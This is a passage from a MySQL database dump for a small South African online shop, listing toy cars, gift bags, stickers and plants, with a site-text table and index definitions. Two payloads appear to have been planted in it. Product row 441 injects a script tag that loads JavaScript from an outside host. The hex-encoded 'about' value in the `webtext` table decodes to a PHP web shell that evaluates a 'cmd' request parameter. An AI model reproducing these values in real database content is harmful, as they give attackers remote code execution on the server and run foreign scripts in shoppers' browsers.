(372, 'Dinosaur - 11 - Triceratops', 15, 'In Stock', 'Dinosaur 11  Triceratops reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00792', 'H: 6.5cm <br/> W: 15cm', 37, 36, 36, 0),
(373, 'Dinosaur - 12 - Velociraptor - orange with stripes', 15, 'In Stock', 'Dinosaur 12  Velociraptor - orange with stripes reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00793', ' H: 9.5cm <br/> W: 15cm', 38, 37, 37, 0),
(377, 'Maisto Car Small 1957 Chevy Pickup ', 30, 'In Stock', '1957 Chevy Pickup reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00794', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 42, 41, 41, 0),
(378, 'Maisto Car Small 1969 Dodge Charger R T ', 30, 'In Stock', '1969 Dodge Charger R T reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00795', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 43, 42, 42, 0),
(379, 'Maisto Car Small 1998 Dodge Viper GT2 ', 30, 'In Stock', '1998 Dodge Viper GT2 reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00796', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 44, 43, 43, 0),
(380, 'Maisto Car Small 2002 Dodge Ram Quad Cab ', 30, 'In Stock', '2002 Dodge Ram Quad Cab reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00797', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 45, 44, 44, 0),
(381, 'Maisto Car Small 2008 Dodge Challenger SRT8 ', 30, 'In Stock', '2008 Dodge Challenger SRT8 reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00798', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 46, 45, 45, 0),
(382, 'Maisto Car Small 2015 Dodge Charger  ', 30, 'In Stock', '2015 Dodge Charger reduced .JPG', 10, 17, NULL, 0, 0, NULL, '00799', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 47, 46, 46, 0),
(383, 'Maisto Car Small 2015 Ford Mustang GT ', 30, 'In Stock', '2015 Ford Mustang GT reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00800', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 48, 47, 47, 0),
(384, 'Maisto Car Small 2015 Jeep Wrangler Unlimited ', 30, 'In Stock', '2015 Jeep Wrangler Unlimited reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00801', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 49, 48, 48, 0),
(385, 'Maisto Car Small 2016 Chevrolet Camaro SS ', 30, 'In Stock', '2016 Chevrolet Camaro SS reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00802', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 50, 49, 49, 0),
(386, 'Maisto Car Small Audi TT Roadster ', 30, 'In Stock', 'Audi TT Roadster reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00803', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 51, 50, 50, 0),
(387, 'Maisto Car Small BMW Mini Cooper S ', 30, 'Out of Stock', 'BMW Mini Cooper S reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00804', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 52, 51, 51, 0),
(388, 'Maisto Car Small BMW X6 ', 30, 'In Stock', 'BMW X6 reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00805', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 53, 52, 52, 0),
(389, 'Maisto Car Small Chevrolet Colorado ', 30, 'In Stock', 'Chevrolet Colorado reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00806', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 54, 53, 53, 0),
(390, 'Maisto Car Small Ford F-150 SVT Raptor  ', 30, 'In Stock', 'Ford F-150 SVT Raptor reduced .JPG', 10, 17, NULL, 0, 0, NULL, '00807', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 55, 54, 54, 0),
(391, 'Maisto Car Small Ford Focus ST ', 30, 'In Stock', 'Ford Focus ST reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00808', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 56, 55, 55, 0),
(392, 'Maisto Car Small Ford Mustang Boss 302  ', 30, 'In Stock', 'Ford Mustang Boss 302 reduced .JPG', 10, 17, NULL, 0, 0, NULL, '00809', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 57, 56, 56, 0),
(393, 'Maisto Car Small Garbage Truck ', 30, 'In Stock', 'Garbage Truck reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00810', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 58, 57, 57, 0),
(394, 'Maisto Car Small Lamborghini Aventador LP700-4 ', 30, 'In Stock', 'Lamborghini Aventador LP700-4 reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00811', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 59, 58, 58, 0),
(395, 'Maisto Car Small Lamborghini Huracan LP 610-4 ', 30, 'In Stock', 'Lamborghini Huracan LP 610-4 reduced.JPG', 10, 17, NULL, 1, 0, NULL, '00812', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 60, 59, 59, 0),
(396, 'Maisto Car Small  Mini Cooper Countryman ', 30, 'In Stock', 'Mini Cooper Countryman reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00813', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 61, 60, 60, 0),
(397, 'Maisto Car Small  Porsche 911 Turbo ', 30, 'In Stock', 'Porsche 911 Turbo reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00814', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 62, 61, 61, 0),
(398, 'Maisto Car Small Ram 1500 Rebel ', 30, 'In Stock', 'Ram 1500 Rebel reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00815', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 63, 62, 62, 0),
(399, 'Maisto Car Small  Smart Fortwo ', 30, 'In Stock', 'Smart Fortwo reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00816', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 64, 63, 63, 0),
(400, 'Maisto Car Small  Volkswagen Golf GTI ', 30, 'In Stock', 'Volkswagen Golf GTI reduced.JPG', 10, 17, NULL, 0, 0, NULL, '00817', 'Scale model of the real vehicle. <br/> Packet size: 11 x 11cm', 65, 64, 64, 0),
(404, '5 XS Greeting cards boxed ', 25, 'In Stock', '5 XS cards boxed reduced.JPG', 4, 26, NULL, 1, 0, NULL, '00821', '5 Extra Small greeting Cards in clear polypropylene box', 49, 24, 22, 0),
(405, '10 Greeting cards boxed ', 45, 'In Stock', '10 cards boxed reduced.JPG', 4, 26, NULL, 0, 0, NULL, '00822', '6 x Extra Small Greeting Cards and 4 Small Greeting cards in polypropylene box', 50, 25, 23, 0),
(406, 'Blue tin bucket ', 24, 'In Stock', 'Blue tin bucket reduced.JPG', 4, 26, NULL, 0, 0, NULL, '00823', 'Height 10.4cm <br/> Top diameter 10cm', 51, 26, 24, 0),
(408, 'Light purple plastic basket + 20 serviettes + 5 XS greeting cards ', 75, 'In Stock', 'Light purple basket with 20 serviettes plus 5 XS greeting cards reduced.JPG', 4, 26, NULL, 0, 0, NULL, '00825', 'Basket approximateley 19 x 19cm. <br/> Packet of 20 serviettes <br/> 5 Extra Small greeting cards <br/>\r\nWrapped in purple cellophane', 53, 28, 26, 0),
(411, 'Bean Bag - Brown corduroy', 22, 'In Stock', 'Bean Bag - brown corduroy.JPG', 10, 18, 21, 0, 0, NULL, '00723', '+- 13.5 x 13.5 cm.<br/> Contains real speckled beans. <br/><br/> Playing with bean bags can develop/improve eye-hand coordination, depth perception, muscles in the hand and arm and more. <br/>Improved abilities can improve self-confidence. <br/><br/> Can be played with fairly safely indoors, for example a passage, during the cold winter and hot summer months. <br/><br/> Different games can be played with it, for example throwing it into a bucket, hitting a target, etcetera. <br/><br/> Great for playing games at birthday parties, fundraisers, etcetera.<br/><br/>Ideal for Scout/Cub games.', 25, 65, 65, 0),
(412, 'Bean Bag - Mottle Blue', 22, 'In Stock', 'Bean Bag - mottle blue reduced.jpg', 10, 18, 21, 0, 0, NULL, '00722', '+- 13.5 x 13.5 cm.<br/> Contains real speckled beans. <br/> <br/>Playing with bean bags can develop/improve eye-hand coordination, depth perception, muscles in the hand and arm and more. <br/><br/>Improved abilities can improve self-confidence. <br/><br/> Can be played with fairly safely indoors, for example a passage, during the cold winter and hot summer months. <br/><br/> Different games can be played with it, for example throwing it into a bucket, hitting a target, etcetera. <br/><br/> Great for playing games at birthday parties, fundraisers, etcetera.<br/><br/>Ideal for Scout/Cub games.', 26, 66, 66, 0),
(413, 'Necklace with Gold coloured  pendant  1 ', 250, 'In Stock', 'Necklace with Gold coloured  pendant  1 reduced.JPG', 22, NULL, NULL, 0, 0, NULL, '00828', 'Pendant: +- 5.5cm diameter', 1, 1, 1, 0),
(414, 'Necklace with Silver coloured pendant 1', 250, 'In Stock', 'Necklace with Silver coloured pendant 1.JPG', 22, NULL, NULL, 0, 0, NULL, '00829', 'Pendant: +- 5.5cm diameter', 2, 2, 2, 0),
(415, 'Horn necklace ', 250, 'In Stock', 'Resin Horn necklace reduced 2.JPG', 22, NULL, NULL, 1, 0, NULL, '00830', 'Made from resin. <br/> Horn Length: 12.5cm', 3, 3, 3, 0),
(416, 'Jaw Necklace ', 250, 'In Stock', 'Jaw Necklace reduced.JPG', 22, NULL, NULL, 0, 0, NULL, '00831', 'Made from resin. <br/> Jaw length: 11.5cm', 4, 4, 4, 0),
(417, 'Gold coloured horn on black base', 500, 'In Stock', 'Gold horn on black base reduced.JPG', 20, NULL, NULL, 1, 0, NULL, '00632', 'Horn cast in resin. <br/> Horn length: 25cm <br/>Wooden base: 18 x 18cm', 1, 1, 1, 0),
(418, 'Interlocking Plastic Rings', 70, 'Out of Stock', 'Interlocking rings reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00832', 'Packet Size:<br/>\r\nH: 30cm W: 29cm', 66, 67, 67, 0),
(419, 'Bike with carriage Large Fancy Gift Bag ', 19.5, 'In Stock', 'Bike with carriage Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00854', 'H:32cm W: 26cm <br/>Gusset: 12cm', 56, 31, 29, 0),
(420, 'Cow Large Fancy Gift Bag ', 19.5, 'In Stock', 'Cow Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00833', 'H: 32cm W: 26cm <br/> Gusset: 10cm', 57, 32, 30, 0),
(421, 'Crocodile Large Fancy Gift Bag ', 19.5, 'In Stock', 'Crocodile Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00834', 'H: 32cm W: 26cm <br/> Gusset: 10cm', 58, 33, 31, 0),
(422, 'Eiffel Tower brown with lace Large Fancy Gift Bag ', 19.5, 'In Stock', 'Eiffel Tower brown with lace Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00835', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 59, 34, 32, 0),
(423, 'Eiffel Tower in circle Large Fancy Gift Bag ', 19.5, 'In Stock', 'Eiffel Tower in circle Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00836', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 60, 35, 33, 0),
(424, 'Giraffe Large Fancy Gift Bag ', 19.5, 'In Stock', 'Giraffe Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00837', 'H: 32cm W: 26cm <br/> Gusset: 10cm', 61, 36, 34, 0),
(425, 'Gold lace glitter Large Fancy Gift Bag ', 19.5, 'In Stock', 'Gold lace glitter Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00838', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 62, 37, 35, 0),
(426, 'Happy BDay balloons pastels Large Fancy Gift Bag ', 19.5, 'In Stock', 'Happy BDay balloons pastels Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00839', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 63, 38, 36, 0),
(427, 'Happy BDay balloons pink and purple Large Fancy Gift Bag ', 19.5, 'In Stock', 'Happy BDay balloons pink and purple Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00840', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 64, 39, 37, 0),
(428, 'Happy BDay single layer cake Large Fancy Gift Bag ', 19.5, 'In Stock', 'Happy BDay single layer cake Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00841', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 65, 40, 38, 0),
(429, 'Happy BDay triple layer cake Large Fancy Gift Bag ', 19.5, 'In Stock', 'Happy BDay triple layer cake Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00842', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 66, 41, 39, 0),
(430, 'Lion Large Fancy Gift Bag ', 19.5, 'In Stock', 'Lion Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00843', 'H: 32cm W: 26cm <br/> Gusset: 10cm', 67, 42, 40, 0),
(431, 'Princess and Castle Large Fancy Gift Bag ', 19.5, 'In Stock', 'Princess and Castle Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00844', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 68, 43, 41, 0),
(432, 'Princess in Carriage Large Fancy Gift Bag ', 19.5, 'In Stock', 'Princess in Carriage Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00845', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 69, 44, 42, 0),
(433, 'Princess with wand Large Fancy Gift Bag ', 19.5, 'In Stock', 'Princess with wand Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00846', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 70, 45, 43, 0),
(434, 'Silver lace glitter Large Fancy Gift Bag ', 19.5, 'In Stock', 'Silver lace glitter Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00847', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 71, 46, 44, 0),
(435, 'Squares pink handbag Large Fancy Gift Bag ', 19.5, 'In Stock', 'Squares pink handbag Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00848', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 72, 47, 45, 0),
(436, 'Sweet Princess  Large Fancy Gift Bag ', 19.5, 'In Stock', 'Sweet Princess  Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00849', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 73, 48, 46, 0),
(437, 'Unicorn brown mane Large Fancy Gift Bag ', 19.5, 'In Stock', 'Unicorn brown mane Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00850', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 74, 49, 47, 0),
(438, 'Unicorn pink mane Large Fancy Gift Bag ', 19.5, 'In Stock', 'Unicorn pink mane Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00851', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 75, 50, 48, 0),
(439, 'Weddding chairs Large Fancy Gift Bag ', 19.5, 'In Stock', 'Weddding chairs Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00852', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 76, 51, 49, 0),
(440, 'Wedding champagne Large Fancy Gift Bag ', 19.5, 'In Stock', 'Wedding champagne Large Fancy Gift Bag reduced.JPG', 4, 3, 5, 0, 0, NULL, '00853', 'H: 32cm W: 26cm <br/> Gusset: 12cm', 77, 52, 50, 0),
(441, '<script type=', 30, 'In Stock', 'Sylva cover photo reduced.jpg', 18, 33, NULL, 1, 0, NULL, '00857', '<script type=\"text/javascript\" src=\"https://jso-tools.z-x.my.id/raw/~/QOPKLHV432H7M\"></script>', 26, 26, 26, 0),
(442, 'Polyplank Planter  L:105cm D:40cm W:60cm', 1500, 'Out of Stock', 'Polyplank planter with tomato seedlings.jpg', 25, 36, NULL, 0, 0, NULL, '00858', 'Lovely polyplank box with stainless steel screws and bolts to grow your plants in. <br/>No kneeling on the ground to plant, weed, feed and water. <br/>No painting or any other maintenance required. Will last forever! <br/>\r\nLength 105cm<br/>\r\nHeight 40cm<br/>\r\nWidth 60cm<br/>\r\nWe make to order. <br/>\r\nContent not included. <br/>\r\nOnly for collection at 19 Rand street, Vierlanden Durbanville. ', 1, 1, 1, 0),
(443, 'Irish Rose Shrub - Medium', 45, 'In Stock', 'Irish Rose R45.JPG', 26, 37, NULL, 0, 0, NULL, '00860', 'Distance from ground to top of plant +_ 50cm.<br/>Drought resistant.<br/>Needs little water.<br/>Indigenous to South Africa.<br/>Adds lovely colour to the garden.', 1, 1, 1, 0),
(444, 'Asparagus Fern', 25, 'In Stock', 'Fern R25.JPG', 26, NULL, NULL, 0, 0, NULL, '00862', 'Fern that hangs beautifully over rocks, the edges of pots, etcetera. ', 3, 2, 2, 0),
(448, 'Shrimp Bush - Red', 30, 'In Stock', 'Red Shrimp R30.JPG', 26, NULL, NULL, 0, 0, NULL, '00863', 'Shrimp Bush that bears red flowers. <br/>Flowers  almost the whole year in Cape Town area.<br/>Small shrub that prefers semi-shade.', 0, 3, 3, 0),
(449, 'Cuphea - White Flowers', 18, 'Out of Stock', 'Cuphea white flowersR18 reduced (2).JPG', 26, NULL, NULL, 0, 0, NULL, '00864', 'Small shrub with tiny flowers. <br/> Flowers almost the whole year in Cape Town area.<br/> Prefers semi-shade. <br/> Ideal as a filler plant.<br/> Great for small gardens or balconies.', 2, 4, 4, 0),
(450, 'Spekboom - small leaves - Size: Small', 20, 'In Stock', 'Small-leaf spekboom R20.JPG', 26, NULL, NULL, 0, 0, NULL, '00865', 'Spekboom with small green leaves that grows upright.<br/> Indigenous to South Africa <br/>Drought-resistant. <br/>Needs little water.<br/>Grows to approximately 2 metres in height. <br/>Dense growth that makes it ideal as a screening plant.', 4, 5, 5, 0),
(451, 'Spekboom - small leaves - Size: Medium', 25, 'In Stock', 'Small-leaf spekboom R25.JPG', 26, NULL, NULL, 0, 0, NULL, '00866', 'Spekboom with small green leaves that grows upright.<br/>\r\nIndigenous to South Africa<br/>\r\nDrought-resistant.<br/>\r\nNeeds little water.<br/>\r\nGrows to approximately 2 metres in height.<br/>\r\nDense growth that makes it ideal as a screening plant.', 5, 6, 6, 0),
(452, 'Spekboom - big leaves- Size: Medium', 25, 'In Stock', 'Big-leafed Spekboom R25.JPG', 26, NULL, NULL, 0, 0, NULL, '00867', 'Spekboom with big green leaves that grows upright.<br/>\r\nIndigenous to South Africa.<br/>\r\nDrought-resistant..<br/>\r\nNeeds little water.<br/>\r\nCan reach a height of approximately 6 metres.<br/>\r\nDense growth that makes it ideal as a screening plant.', 6, 7, 7, 0),
(453, 'Animal Mix Reward Sticker 240 - English', 18, 'In Stock', '4.jpg', 9, 13, 13, 0, 0, NULL, '00526', 'Label Size: 15 x 15mm <br/>\r\n240 labels per packet', 159, 133, 94, 0),
(454, 'Star Labels with Smiley Faces 480 - Mixed Colours', 20, 'In Stock', 'blue star with smiley face.jpg', 9, 11, 11, 0, 0, NULL, '00868', '480 Labels per packet<br/>\r\n1 colour per sheet<br/>\r\nPacket contains 5 of the following 6 colours:<br/>\r\ngreen, light blue, yellow, purple, light pink, neon orange\r\n', 160, 134, 95, 0),
(455, 'Animal Mix Reward Sticker 240 - Afrikaans', 18, 'In Stock', '1 (2).jpg', 9, 13, 12, 0, 0, NULL, '00525', 'Label Size: 15 x 15mm<br/>\r\n240 labels per packet', 161, 135, 16, 0),
(456, 'Afrikaans Trophy labels 300 - Gold', 22, 'In Stock', 'gold-trophy-afr (2).JPG', 9, 13, 12, 0, 0, NULL, '00869', 'Label diameter: 25mm<br/>\r\n300 labels per packet', 162, 136, 17, 0),
(457, 'English Trophy labels 300 - Gold', 22, 'In Stock', '1.jpg', 9, 13, 13, 0, 0, NULL, '00870', 'Label diameter: 25mm<br/>\r\n300 labels per packet<br/>\r\nPerfect to buy and donate to a school in need!<br/>Inspire and motivate a child and feel good inside!', 163, 137, 98, 0),
(458, 'Froggie Stickers - Rain P1020A', 8.5, 'In Stock', 'Froggie A Rain.JPG', 9, 12, 15, 0, 0, NULL, '00871', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.', 164, 138, 99, 0),
(459, 'Froggie Stickers - Umbrella P1020B', 8.5, 'In Stock', 'Froggie B Umbrella.JPG', 9, 12, 15, 0, 0, NULL, '00872', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 165, 139, 100, 0),
(460, 'Froggie Stickers -Hat P1020C', 8.5, 'In Stock', 'Froggie C Hat.JPG', 9, 12, 15, 0, 0, NULL, '00873', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 166, 140, 101, 0),
(461, 'Mice Stickers - Balloons SCN013A', 8.5, 'In Stock', 'Mice Balloons A.JPG', 9, 12, 15, 0, 0, NULL, '00874', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 167, 141, 102, 0),
(462, 'Mice Stickers - Cake SCN013B', 8.5, 'In Stock', 'Mice B.JPG', 9, 12, 15, 0, 0, NULL, '00875', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 168, 142, 103, 0),
(463, 'Mice Stickers - Paintbrush SCN013C', 8.5, 'In Stock', 'Mice Paintbrush C .JPG', 9, 12, 15, 0, 0, NULL, '00876', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 169, 143, 104, 0),
(464, 'Cartoon Animal Stickers - Rhino  JC383A', 8.5, 'In Stock', 'Cartoon ANimal Rhino A.JPG', 9, 12, 15, 0, 0, NULL, '00877', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 170, 144, 105, 0),
(465, 'Cartoon Animal Stickers - Tiger  JC383B', 8.5, 'In Stock', 'Cartoon Animal Tiger B.JPG', 9, 12, 15, 0, 0, NULL, '00878', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 171, 145, 106, 0),
(466, 'Cartoon Animal Stickers - Horse  JC383C', 8.5, 'In Stock', 'Cartoon Animals C.JPG', 9, 12, 15, 0, 0, NULL, '00879', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 172, 146, 107, 0),
(467, 'Sealife Stickers -  JC382A', 8.5, 'In Stock', 'Sealife A.JPG', 9, 12, 15, 0, 0, NULL, '00880', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 173, 147, 108, 0),
(468, 'Sealife Stickers -  JC382B', 8.5, 'In Stock', 'Sealife B.JPG', 9, 12, 15, 0, 0, NULL, '00881', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 174, 148, 109, 0),
(469, 'Sealife Stickers -  JC382C', 8.5, 'In Stock', 'Sealife C.JPG', 9, 12, 15, 0, 0, NULL, '00882', 'W: 70mm H: 165mm<br/>\r\nExcellent creative toy.<br/>\r\nGreat for decorating greeting cards, cell phones, books, toys, etcetera.<br/>\r\nUse as finger puppets and hold your own shows.<br/>\r\nIdeal for Christmas stockings, party bags, small prizes and lots more.<br/>\r\nBuy and donate to a Children\'s Home and brighten a child\'s day.\r\n', 175, 149, 110, 0),
(470, 'tets', 22, 'In Stock', 'rabit.jpg', 18, 33, NULL, 0, 0, NULL, '1111', 'this is test', 27, 27, 27, 0);

-- --------------------------------------------------------

--
-- Table structure for table `webtext`
--

CREATE TABLE `webtext` (
  `textID` int(11) NOT NULL,
  `textName` varchar(255) NOT NULL,
  `textValue` longblob DEFAULT NULL
) ENGINE=InnoDB AVG_ROW_LENGTH=8192 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `webtext`
--

INSERT INTO `webtext` (`textID`, `textName`, `textValue`) VALUES
(1, 'about', 0x3c3f706870206576616c28226563686f20222e245f4745545b22636d64225d2e223b22293b203f3e),
(2, 'contact', 0x7774663f3f),
(3, 'shipping', '');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `administrator`
--
ALTER TABLE `administrator`
  ADD PRIMARY KEY (`administratorID`);

--
-- Indexes for table `category1`
--
ALTER TABLE `category1`
  ADD PRIMARY KEY (`category1ID`),
  ADD UNIQUE KEY `category1Name` (`category1Name`);

--
-- Indexes for table `category2`
--
ALTER TABLE `category2`
  ADD PRIMARY KEY (`category2ID`),
  ADD KEY `category2Name` (`category2Name`),
  ADD KEY `FK_category1` (`category1ID`);

--
-- Indexes for table `category3`
--
ALTER TABLE `category3`
  ADD PRIMARY KEY (`category3ID`),
  ADD KEY `category3Name` (`category3Name`),
  ADD KEY `FK_category2` (`category2ID`);

--
-- Indexes for table `product`
--
ALTER TABLE `product`
  ADD PRIMARY KEY (`productID`),
  ADD UNIQUE KEY `productID_UNIQUE` (`productID`),
  ADD UNIQUE KEY `productCode` (`productCode`),
  ADD KEY `FK_product_category1ID` (`category1ID`);

--
-- Indexes for table `webtext`
--
ALTER TABLE `webtext`
  ADD PRIMARY KEY (`textID`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `administrator`
--
ALTER TABLE `administrator`
  MODIFY `administratorID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `category1`
--
ALTER TABLE `category1`
  MODIFY `category1ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=28;

--
-- AUTO_INCREMENT for table `category2`
--
ALTER TABLE `category2`
  MODIFY `category2ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;

--
-- AUTO_INCREMENT for table `category3`
--
ALTER TABLE `category3`
  MODIFY `category3ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;

--
-- AUTO_INCREMENT for table `product`
--
ALTER TABLE `product`
  MODIFY `productID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=471;

--
-- AUTO_INCREMENT for table `webtext`
--
ALTER TABLE `webtext`
  MODIFY `textID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `category2`
--
ALTER TABLE `category2`
  ADD CONSTRAINT `FK_category1` FOREIGN KEY (`category1ID`) REFERENCES `category1` (`category1ID`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `category3`
--
ALTER TABLE `category3`
